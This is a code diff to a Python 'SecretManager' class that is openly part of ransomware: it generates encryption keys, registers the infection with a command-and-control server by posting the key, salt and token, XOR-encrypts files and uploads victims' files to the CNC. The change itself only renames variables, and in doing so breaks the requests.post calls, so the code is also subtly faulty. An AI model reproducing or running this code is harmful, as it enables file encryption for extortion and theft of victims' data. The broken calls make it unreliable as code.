@@ -39,15 +39,15 @@ class SecretManager:
         return KDF.derive(key)
 
     def create(self)->Tuple[bytes, bytes, bytes]: # create crypto DATA
-        salt = secrets.token_bytes(self.SALT_LENGTH)
-        key = secrets.token_bytes(self.KEY_LENGTH)
-        token = secrets.token_bytes(self.TOKEN_LENGTH)
-        return salt, key, token
+        SALT = secrets.token_bytes(self.SALT_LENGTH)
+        KEY = secrets.token_bytes(self.KEY_LENGTH)
+        TOKEN = secrets.token_bytes(self.TOKEN_LENGTH)
+        return SALT, KEY, TOKEN
 
 
     def bin_to_b64(self, DATA:bytes)->str: # convert binary DATA to base64
-        tmp = base64.b64encode(DATA)
-        return str(tmp, "utf8")
+        TMP = base64.b64encode(DATA)
+        return str(TMP, "utf8")
 
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
@@ -59,24 +59,24 @@ class SecretManager:
             "token": self.bin_to_b64(token),
         }
         self._log.info(f"POST {URL} {DATA}")
-        r = requests.post(URL, DATA=DATA)
-        self._log.info(f"POST {URL} {DATA} {r.status_code}")
-        if r.status_code != 200:
+        R = requests.post(URL, DATA=DATA)
+        self._log.info(f"POST {URL} {DATA} {R.status_code}")
+        if R.status_code != 200:
             raise Exception("Error while registering to the CNC")
 
     def setup(self)->None: # main function to create crypto DATA and register malware to cnc
-        salt, key, token = self.create() # create crypto DATA
-        self.post_new(salt, key, token) # register to the CNC
-        self._salt = salt # set the salt
-        self._key = key # set the key
-        self._token = token # set the token
+        SALT, KEY, TOKEN = self.create() # create crypto DATA
+        self.post_new(SALT, KEY, TOKEN) # register to the CNC
+        self._salt = SALT # set the salt
+        self._key = KEY# set the key
+        self._token = TOKEN # set the token
         # save token in token.bin if not already present
         if not os.path.exists(os.path.join(self._path, "token.bin")): # if token.bin not present
             with open(os.path.join(self._path, "token.bin"),
                         "wb") as f:
-                    f.write(token)
+                    f.write(TOKEN)
         with open(os.path.join(self._path, "salt.bin"), "wb") as f:
-            f.write(salt)
+            f.write(SALT)
             self._log.info("Setup done") # log
 
 
@@ -105,9 +105,9 @@ class SecretManager:
 
     def set_key(self, b64_key:str)->None:
         # If the key is valid, set the self._key var for decrypting
-        key = base64.b64decode(b64_key)
-        if self.check_key(key):
-            self._key = key
+        KEY = base64.b64decode(b64_key)
+        if self.check_key( KEY):
+            self._key =  KEY
             self._log.info("Key set")
         else:
             raise Exception("Invalid key")
@@ -116,8 +116,8 @@ class SecretManager:
     def get_hex_token(self)->str:
         # Return a string composed of hex symbole, regarding the token
         with open (os.path.join(self._path, "token.bin"), "rb") as f:
-            token = f.read()
-        return str(token.hex())
+            TOKEN = f.read()
+        return str(TOKEN.hex())
 
 
     def xorfiles(self, files:List[str])->None:
@@ -139,9 +139,9 @@ class SecretManager:
                 "filename": f
             }
             self._log.info(f"POST {URL} {DATA}")
-            r = requests.post(URL, DATA=DATA)
-            self._log.info(f"POST {URL} {DATA} {r.status_code}")
-            if r.status_code != 200:
+            R = requests.post(URL, DATA=DATA)
+            self._log.info(f"POST {URL} {DATA} {R.status_code}")
+            if R.status_code != 200:
                 raise Exception("Error while sending file to the CNC")
 
     def clean(self):# Mr propre
